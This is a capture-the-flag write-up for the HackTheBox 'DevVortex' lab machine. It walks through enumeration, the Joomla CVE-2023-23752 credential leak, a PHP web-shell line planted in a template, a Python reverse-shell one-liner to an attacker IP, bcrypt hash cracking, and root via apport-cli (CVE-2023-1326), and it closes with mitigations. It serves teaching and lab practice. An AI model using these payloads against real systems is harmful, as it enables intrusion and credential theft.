---
title: "HackTheBox - DevVortex"
author: Nasrallah
description: ""
date: 2024-04-27 00:00:00 +0000
categories : [HackTheBox, Machines]
tags: [hackthebox, linux, easy, sudo, cve, informationdisclosure, hashcat, crack, joomla]
img_path: /assets/img/hackthebox/machines/devvortex
image:
    path: devvortex.png
---

<div align="center"> <script src="https://www.hackthebox.eu/badge/565048"></script> </div>

---

## **Description**

[devvortex](https://www.hackthebox.com/machines/devvortex) from [HackTheBox](https://www.hackthebox.com) runs a Joomla CMS vulnerable to information disclosure where we get credentials of the database that also work for the administrator page, we login and modify a template to get a web shell and then a full reverse shell. We access the database and find a hash, we crack it and become another user. To get root we exploit a vulnerable software that we can run as sudo giving us a root shell.

## **Enumeration**

### nmap

We start an Nmap scan using the following command: `sudo nmap -sC -sV -T4 {target_IP}`.

- -sC: run all the default scripts.

- -sV: Find the version of services running on the target.

- -T4: Aggressive scan to provide faster results.

```terminal
Nmap scan report for devvortex.htb (10.10.11.242)                                                                                                                                                                                           
Host is up (0.44s latency).                                                                                                                                                                                                                 
Not shown: 998 closed tcp ports (reset)                                                                                                                                                                                                     
PORT   STATE SERVICE VERSION                                                                                                                                                                                                                
22/tcp open  ssh     OpenSSH 8.2p1 Ubuntu 4ubuntu0.9 (Ubuntu Linux; protocol 2.0)                                                                                                                                                           
| ssh-hostkey:                                                                                                                                                                                                                              
|   3072 48:ad:d5:b8:3a:9f:bc:be:f7:e8:20:1e:f6:bf:de:ae (RSA)                                                                                                                                                                              
|   256 b7:89:6c:0b:20:ed:49:b2:c1:86:7c:29:92:74:1c:1f (ECDSA)                                                                                                                                                                             
|_  256 18:cd:9d:08:a6:21:a8:b8:b6:f7:9f:8d:40:51:54:fb (ED25519)                                                                                                                                                                           
80/tcp open  http    nginx 1.18.0 (Ubuntu)                                                                                                                                                                                                  
|_http-title: DevVortex                                                                                                                                                                                                                     
|_http-server-header: nginx/1.18.0 (Ubuntu)                                                                                                                                                                                                 
Service Info: OS: Linux; CPE: cpe:/o:linux:linux_kernel  
```

We found ssh on port 22 and nginx web server on port 80.

### Web

Let's check the web page.

We got redirected to the `devvorted.htb` domain. Let's add it to `/etc/hosts`.

![wepage](1.png)

The website belongs to some web developers. Nothing interesting.

#### Feroxbuster

Let's run a directory scan.

```terminal
$ feroxbuster -w /usr/share/wordlists/seclists/Discovery/Web-Content/big.txt -u http://devvortex.htb/ -n                                                                                                                       [3210/3516]

 ___  ___  __   __     __      __         __   ___
|__  |__  |__) |__) | /  `    /  \ \_/ | |  \ |__
|    |___ |  \ |  \ | \__,    \__/ / \ | |__/ |___
by Ben "epi" Risher 🤓                 ver: 2.10.1
───────────────────────────┬──────────────────────
 🎯  Target Url            │ http://devvortex.htb/
 🚀  Threads               │ 50
 📖  Wordlist              │ /usr/share/wordlists/seclists/Discovery/Web-Content/big.txt
 👌  Status Codes          │ All Status Codes!
 💥  Timeout (secs)        │ 7
 🦡  User-Agent            │ feroxbuster/2.10.1
 💉  Config File           │ /etc/feroxbuster/ferox-config.toml
 🔎  Extract Links         │ true
 🏁  HTTP methods          │ [GET]
 🚫  Do Not Recurse        │ true
───────────────────────────┴──────────────────────
 🏁  Press [ENTER] to use the Scan Management Menu™
──────────────────────────────────────────────────
404      GET        7l       12w      162c Auto-filtering found 404-like response and created new filter; toggle off with --dont-filter
200      GET      229l      475w     6845c http://devvortex.htb/portfolio.html
200      GET        9l       24w     2405c http://devvortex.htb/images/d-2.png
200      GET        5l       23w     1217c http://devvortex.htb/images/location-white.png
200      GET      100l      178w     1904c http://devvortex.htb/css/responsive.css
200      GET        6l       13w      639c http://devvortex.htb/images/quote.png
200      GET      254l      520w     7603c http://devvortex.htb/do.html
200      GET        5l       55w     1797c http://devvortex.htb/images/linkedin.png
200      GET       11l       39w     3419c http://devvortex.htb/images/d-4.png
200      GET        5l       48w     1493c http://devvortex.htb/images/fb.png
200      GET        6l       57w     1878c http://devvortex.htb/images/youtube.png
200      GET      231l      545w     7388c http://devvortex.htb/about.html
200      GET      289l      573w     8884c http://devvortex.htb/contact.html
200      GET        5l       12w      847c http://devvortex.htb/images/envelope-white.png
200      GET        7l       30w     2018c http://devvortex.htb/images/d-3.png
200      GET        6l       52w     1968c http://devvortex.htb/images/twitter.png
200      GET       11l       50w     2892c http://devvortex.htb/images/d-1.png
200      GET       44l      290w    17183c http://devvortex.htb/images/c-1.png
200      GET        3l       10w      667c http://devvortex.htb/images/telephone-white.png
200      GET      714l     1381w    13685c http://devvortex.htb/css/style.css
200      GET       71l      350w    24351c http://devvortex.htb/images/c-2.png
200      GET       87l      363w    24853c http://devvortex.htb/images/c-3.png
200      GET      583l     1274w    18048c http://devvortex.htb/index.html
200      GET      512l     2892w   241721c http://devvortex.htb/images/w-4.png
200      GET        2l     1276w    88145c http://devvortex.htb/js/jquery-3.4.1.min.js
200      GET      348l     2369w   178082c http://devvortex.htb/images/map-img.png
200      GET      536l     3109w   243112c http://devvortex.htb/images/w-3.png
200      GET     4440l    10999w   131868c http://devvortex.htb/js/bootstrap.js
200      GET      536l     2364w   201645c http://devvortex.htb/images/who-img.jpg
200      GET      675l     4019w   330600c http://devvortex.htb/images/w-1.png
200      GET      636l     3934w   306731c http://devvortex.htb/images/w-2.png
200      GET    10038l    19587w   192348c http://devvortex.htb/css/bootstrap.css
200      GET      583l     1274w    18048c http://devvortex.htb/
301      GET        7l       12w      178c http://devvortex.htb/css => http://devvortex.htb/css/
301      GET        7l       12w      178c http://devvortex.htb/images => http://devvortex.htb/images/
301      GET        7l       12w      178c http://devvortex.htb/js => http://devvortex.htb/js/
[###################>] - 2m     19894/20514   0s      found:35      errors:0      
```

We found a lot of the website's images and files, nothing useful at the moment.

#### Subdomains

Let's brute force subdomains using `wfuzz`.

```bash
wfuzz -c -w /usr/share/seclists/Discovery/DNS/subdomains-top1million-110000.txt -u http://devvortex.htb/ -H "Host: FUZZ.devvortex.htb" --hl 7
```

```terminal
$ wfuzz -c -w /usr/share/seclists/Discovery/DNS/subdomains-top1million-110000.txt -u http://devvortex.htb/ -H "Host: FUZZ.devvortex.htb" --hl 7                                                                                           
 /usr/lib/python3/dist-packages/wfuzz/__init__.py:34: UserWarning:Pycurl is not compiled against Openssl. Wfuzz might not work correctly when fuzzing SSL sites. Check Wfuzz's documentation for more information.                          
********************************************************                                                                                                                                                                                    
* Wfuzz 3.1.0 - The Web Fuzzer                         *
********************************************************

Target: http://devvortex.htb/
Total requests: 114441

=====================================================================
ID           Response   Lines    Word       Chars       Payload                                                                                                                                                                     
=====================================================================

000000019:   200        501 L    1581 W     23221 Ch    "dev"                                                                                                                                                                       

/usr/lib/python3/dist-packages/wfuzz/wfuzz.py:80: UserWarning:Finishing pending requests...

Total time: 98.42331
Processed Requests: 1926
Filtered Requests: 1925
Requests/sec.: 19.56853
```

We found the subdomain `dev`, let's add `dev.devvortex.htb` to `/etc/hosts` file and navigate to the web page.

![subpage](2.png)

Nothing interesting, let's run another directory scan.

```terminal
$ feroxbuster -w /usr/share/wordlists/seclists/Discovery/Web-Content/big.txt -u http://dev.devvortex.htb -n                                                                                                                     [852/1373]

 ___  ___  __   __     __      __         __   ___
|__  |__  |__) |__) | /  `    /  \ \_/ | |  \ |__
|    |___ |  \ |  \ | \__,    \__/ / \ | |__/ |___
by Ben "epi" Risher 🤓                 ver: 2.10.1
───────────────────────────┬──────────────────────
 🎯  Target Url            │ http://dev.devvortex.htb
 🚀  Threads               │ 50
 📖  Wordlist              │ /usr/share/wordlists/seclists/Discovery/Web-Content/big.txt
 👌  Status Codes          │ All Status Codes!
 💥  Timeout (secs)        │ 7
 🦡  User-Agent            │ feroxbuster/2.10.1
 💉  Config File           │ /etc/feroxbuster/ferox-config.toml
 🔎  Extract Links         │ true
 🏁  HTTP methods          │ [GET]
 🚫  Do Not Recurse        │ true
───────────────────────────┴──────────────────────
 🏁  Press [ENTER] to use the Scan Management Menu™
──────────────────────────────────────────────────
404      GET       69l      208w     3653c http://dev.devvortex.htb/installation
404      GET       69l      208w     3653c http://dev.devvortex.htb/logs
404      GET       69l      208w     3653c http://dev.devvortex.htb/bin
404      GET       69l      208w     3653c Auto-filtering found 404-like response and created new filter; toggle off with --dont-filter
403      GET        7l       10w      162c Auto-filtering found 404-like response and created new filter; toggle off with --dont-filter
200      GET        7l       27w     3309c http://dev.devvortex.htb/media/templates/site/cassiopeia/assets/img/apple-touch-icon.png
[...]
301      GET        7l       12w      178c http://dev.devvortex.htb/administrator => http://dev.devvortex.htb/administrator/
404      GET        1l        3w       16c http://dev.devvortex.htb/amfphp
301      GET        7l       12w      178c http://dev.devvortex.htb/api => http://dev.devvortex.htb/api/
404      GET        1l        3w       16c http://dev.devvortex.htb/articlephp
301      GET        7l       12w      178c http://dev.devvortex.htb/cache => http://dev.devvortex.htb/cache/
404      GET        1l        3w       16c http://dev.devvortex.htb/cgi-php
301      GET        7l       12w      178c http://dev.devvortex.htb/cli => http://dev.devvortex.htb/cli/
301      GET        7l       12w      178c http://dev.devvortex.htb/components => http://dev.devvortex.htb/components/
404      GET        1l        3w       16c http://dev.devvortex.htb/contact25php
404      GET        1l        3w       16c http://dev.devvortex.htb/ctpaygatephp
200      GET      501l     1581w    23221c http://dev.devvortex.htb/home
301      GET        7l       12w      178c http://dev.devvortex.htb/images => http://dev.devvortex.htb/images/
301      GET        7l       12w      178c http://dev.devvortex.htb/includes => http://dev.devvortex.htb/includes/
301      GET        7l       12w      178c http://dev.devvortex.htb/language => http://dev.devvortex.htb/language/
301      GET        7l       12w      178c http://dev.devvortex.htb/layouts => http://dev.devvortex.htb/layouts/
301      GET        7l       12w      178c http://dev.devvortex.htb/libraries => http://dev.devvortex.htb/libraries/
404      GET        1l        3w       16c http://dev.devvortex.htb/maphp
301      GET        7l       12w      178c http://dev.devvortex.htb/media => http://dev.devvortex.htb/media/
301      GET        7l       12w      178c http://dev.devvortex.htb/modules => http://dev.devvortex.htb/modules/
```

We found a lot of information this time, the `/administrator/` page sounds interesting so let's take a look at it.

![admin](3.png)

It's `Joomla`.

There is a great scanner of joomla called [joomscan](https://github.com/OWASP/joomscan), let's use it and see what we can find.

![jommscan](4.png)

The version of `Joomla` is `4.2.6`.

Searching on the internet for exploits we find that versions prior to `4.6.8` are vulnerable to `Information disclosure` `CVE-2023-23752`.

A good exploit can be found at <https://github.com/Acceis/exploit-CVE-2023-23752>.

#### Joomla Exploit

```terminal
ruby exploit.rb http://dev.devvortex.htb                                                                                                                                                                                                
Users                                                                                                                                                                                                                                       
[649] lewis (lewis) - lewis@devvortex.htb - Super Users                                                                                                                                                                                     
[650] logan paul (logan) - logan@devvortex.htb - Registered                                                                                                                                                                                 
                                                                                                                                                                                                                                            
Site info                                                                                                                                                                                                                                   
Site name: Development                                                                                                                                                                                                                      
Editor: tinymce                                                                                                                                                                                                                             
Captcha: 0                                                                                                                                                                                                                                  
Access: 1                                                                                                                                                                                                                                   
Debug status: false                                                                                                                                                                                                                         
                                                                                                                                                                                                                                            
Database info                                                                                                                                                                                                                               
DB type: mysqli                                                                                                       
DB host: localhost                                                                                                    
DB user: lewis                                                                                                        
DB password: P4ntherg0t1n5r3c0n##                                                                                     
DB name: joomla                                                                                                       
DB prefix: sd4fg_                                                                                                     
DB encryption 0     
```

The exploit returned a username and a password.

Let's see if we can login to `Joomla`.

![login](5.png)

## **Foothold**

We managed to login successfully to `Joomla`, now it's time for a reverse shell.

We go to `System` -> `Site Templates` and select `Cassiopeia` template.

![template](6.png)

Now we choose `error.php` file and add the following php line that will allow us to execute commands on the system.

```php
system ($_GET['cmd']);
```

![phpshell](7.png)

We click save and go to `http://dev.devvortex.htb/templates/cassiopeia/error.php/error.php?cmd=id` to run commands.

![ce](8.png)

Now we setup a listener and run the following python reverse shell.

```python
export RHOST="10.10.16.24";export RPORT=9002;python3 -c 'import sys,socket,os,pty;s=socket.socket();s.connect((os.getenv("RHOST"),int(os.getenv("RPORT"))));[os.dup2(s.fileno(),fd) for fd in (0,1,2)];pty.spawn("sh")'
```

![prs](9.png)

Great! We got a shell.

## **Privilege Escalation**

### www-data -> logan

Checking the home page we find there is only one user on the system and his name is `logan`.

Tried changing to him using `lewis`'s password but didn't work.

#### Mysql

Let's connect to `mysql` database and see what we can find.

```terminal
www-data@devvortex:~/dev.devvortex.htb/templates/cassiopeia$ mysql -u lewis -p
Enter password: 
Welcome to the MySQL monitor.  Commands end with ; or \g.
Your MySQL connection id is 55
Server version: 8.0.35-0ubuntu0.20.04.1 (Ubuntu)

Copyright (c) 2000, 2023, Oracle and/or its affiliates.

Oracle is a registered trademark of Oracle Corporation and/or its
affiliates. Other names may be trademarks of their respective
owners.

Type 'help;' or '\h' for help. Type '\c' to clear the current input statement.

mysql> show databases;
+--------------------+
| Database           |
+--------------------+
| information_schema |
| joomla             |
| performance_schema |
+--------------------+
3 rows in set (0.00 sec)

mysql> use joomla;
Reading table information for completion of table and column names
You can turn off this feature to get a quicker startup with -A

Database changed
mysql> select username,password from sd4fg_users;
+----------+--------------------------------------------------------------+
| username | password                                                     |
+----------+--------------------------------------------------------------+
| lewis    | $2y$10$6V52x.SD8Xc7hNlVwUTrI.ax4BIAYuhVBMVvnYWRceBmy8XdEzm1u |
| logan    | $2y$10$IT4k5kmSGvHSO9d6M/1w0eYiB5Ne9XzArQRFJTGThNiy/yBtkIj12 |
+----------+--------------------------------------------------------------+
2 rows in set (0.00 sec)

mysql> 
```

We found `logan`'s hash, let's crack it using `hashcat` with the mode `3200`.

```terminal
Dictionary cache hit:
* Filename..: rockyou.txt
* Passwords.: 14344384
* Bytes.....: 139921497
* Keyspace..: 14344384

$2y$10$IT4k5kmSGvHSO9d6M/1w0eYiB5Ne9XzArQRFJTGThNiy/yBtkIj12:


Session..........: hashcat
Status...........: Cracked
Hash.Mode........: 3200 (bcrypt $2*$, Blowfish (Unix))
Hash.Target......: $2y$10$IT4k5kmSGvHSO9d6M/1w0eYiB5Ne9XzArQRFJTGThNiy...tkIj12
Time.Started.....: Sun Dec 24 10:55:33 2023 (13 secs)
Time.Estimated...: Sun Dec 24 10:55:46 2023 (0 secs)
Kernel.Feature...: Pure Kernel
Guess.Base.......: File (rockyou.txt)
Guess.Queue......: 1/1 (100.00%)
Speed.#1.........:      112 H/s (12.87ms) @ Accel:1 Loops:1 Thr:16 Vec:1
Recovered........: 1/1 (100.00%) Digests (total), 1/1 (100.00%) Digests (new)
Progress.........: 1536/14344384 (0.01%)
Rejected.........: 0/1536 (0.00%)
Restore.Point....: 0/14344384 (0.00%)
Restore.Sub.#1...: Salt:0 Amplifier:0-1 Iteration:1023-1024
Candidate.Engine.: Device Generator
Candidates.#1....: 123456 -> mexico1

Started: Sun Dec 24 10:55:20 2023
Stopped: Sun Dec 24 10:55:48 2023
```

We got the password, now let's switch to `logan` or just ssh.

### logan --> root

Let's check our privileges.

```terminal
logan@devvortex:~$ sudo -l                                                                                            
[sudo] password for logan:                                                                                            
Matching Defaults entries for logan on devvortex:                                                                     
    env_reset, mail_badpass, secure_path=/usr/local/sbin\:/usr/local/bin\:/usr/sbin\:/usr/bin\:/sbin\:/bin\:/snap/bin 
                                                                                                                      
User logan may run the following commands on devvortex:                                                               
    (ALL : ALL) /usr/bin/apport-cli
```

We can run `apport-cli` as root.

Checking the version of this program we find it's `2.20.11`. Searching for this we find it's vulnerable to `local privilege escalation` `CVE-2023-1326`

> A privilege escalation attack was found in apport-cli 2.26.0 and earlier which is similar to CVE-2023-26604. If a system is specially configured to allow unprivileged users to run sudo apport-cli, less is configured as the pager, and the terminal size can be set: a local attacker can escalate privilege.
{: .prompt-info }

Let's check the help page:

```terminal
logan@devvortex:~$ sudo /usr/bin/apport-cli -h                                                                                                                                                                                              
Usage: apport-cli [options] [symptom|pid|package|program path|.apport/.crash file]                                                                                                                                                          
                                                                                                                                                                                                                                            
Options:                                                                                                                                                                                                                                    
  -h, --help            show this help message and exit                                                                                                                                                                                     
  -f, --file-bug        Start in bug filing mode. Requires --package and an                                                                                                                                                                 
                        optional --pid, or just a --pid. If neither is given,                                                                                                                                                               
                        display a list of known symptoms. (Implied if a single                                                                                                                                                              
                        argument is given.)                                                                                                                                                                                                 
  -w, --window          Click a window as a target for filing a problem                                                                                                                                                                     
                        report.                                                                                       
  -u UPDATE_REPORT, --update-bug=UPDATE_REPORT                                                                        
                        Start in bug updating mode. Can take an optional                                                                                                                                                                    
                        --package.                                                                                                                                                                                                          
  -s SYMPTOM, --symptom=SYMPTOM                                                                                                                                                                                                             
                        File a bug report about a symptom. (Implied if symptom                                                                                                                                                              
                        name is given as only argument.)                                                                                                                                                                                    
  -p PACKAGE, --package=PACKAGE                                                                                       
                        Specify package name in --file-bug mode. This is                                                                                                                                                                    
                        optional if a --pid is specified. (Implied if package                                                                                                                                                               
                        name is given as only argument.)                                                                                                                                                                                    
  -P PID, --pid=PID     Specify a running program in --file-bug mode. If this                                         
                        is specified, the bug report will contain more                                                
                        information.  (Implied if pid is given as only                                                                                                                                                                      
                        argument.)                                                                                                                                                                                                          
  --hanging             The provided pid is a hanging application.                                                    
  -c PATH, --crash-file=PATH                                                                                          
                        Report the crash from given .apport or .crash file                                            
                        instead of the pending ones in /var/crash. (Implied if                                                                                                                                                              
                        file is given as only argument.)                                                                                                                                                                                    
  --save=PATH           In bug filing mode, save the collected information                                            
                        into a file instead of reporting it. This file can                                            
                        then be reported later on from a different machine.                                                                                                                                                                 
  --tag=TAG             Add an extra tag to the report. Can be specified                                              
                        multiple times.                                                                               
  -v, --version         Print the Apport version number
```

Here we see we can open a crash file located in `/var/crash` using `-c` arguments, and if `less` is used like the cve report says, we can easily escalate from there.

> You need to first run the sudo /usr/bin/apport-cli command with `-w` argument in order to generate the crash file.
{: .prompt-tip }

![crash](10.png)

We manged to open the file and it is using `less`.

Now type `!/bin/bash` to get a root shell.

## **Prevention and Mitigation**

### Joomla

The web server is running a vulnerable version of `Joomla` so it should be upgraded to a newer version.

### Password

The passwords were stored hashed in the database which is good, but `logan`'s password was weak and we managed to crack it.

Password should always be long, use letters and special characters.

A strong hashing algorithm should also be used along with salting to make password cracking more difficult.

### Apport-cli

apport-cli should normally not be called with sudo or pkexec. In case it is called via sudo or pkexec execute `sensible-pager` as the original user to avoid privilege elevation.

---

Thank you for taking the time to read my write-up, I hope you have learned something from this. If you have any questions or comments, please feel free to reach out to me. See you in the next hack :).

## **References**

<https://github.com/OWASP/joomscan>

<https://github.com/Acceis/exploit-CVE-2023-23752>

<https://nvd.nist.gov/vuln/detail/CVE-2023-1326>

<https://github.com/canonical/apport/commit/e5f78cc89f1f5888b6a56b785dddcb0364c48ecb>

<https://ubuntu.com/security/CVE-2023-1326>

<https://github.com/diego-tella/CVE-2023-1326-PoC>
